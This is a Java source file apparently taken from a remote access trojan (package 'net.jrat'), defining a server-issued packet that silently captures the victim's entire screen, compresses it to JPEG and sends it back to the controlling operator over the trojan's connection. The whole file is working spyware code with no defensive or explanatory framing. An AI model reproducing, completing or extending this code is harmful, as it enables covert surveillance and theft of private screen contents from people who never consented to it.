package net.jrat.core.packet.server;

import java.awt.Dimension;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;

import javax.imageio.ImageIO;

import net.jrat.core.Client;
import net.jrat.core.packet.IPacket;
import net.jrat.core.packet.client.C4PacketScreenshot;

public class S8PacketScreenshot implements IPacket
{
	private static final long serialVersionUID = 1L;
	
	private String outputPath;
	
	@Override
	public void execute(Object object) throws Exception
	{
		final Robot robot = new Robot();
		final Dimension screensize = Toolkit.getDefaultToolkit().getScreenSize();

		final int width = (int) screensize.getWidth();
		final int height = (int) screensize.getHeight();
		
		final BufferedImage image = robot.createScreenCapture(new Rectangle(0, 0, width, height));
		
		final ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
		ImageIO.write(image, "jpg", outputStream);
		
		Client.instance.outputStream.writeObject(new C4PacketScreenshot(outputStream.toByteArray(), this.outputPath));
		outputStream.close();
	}
}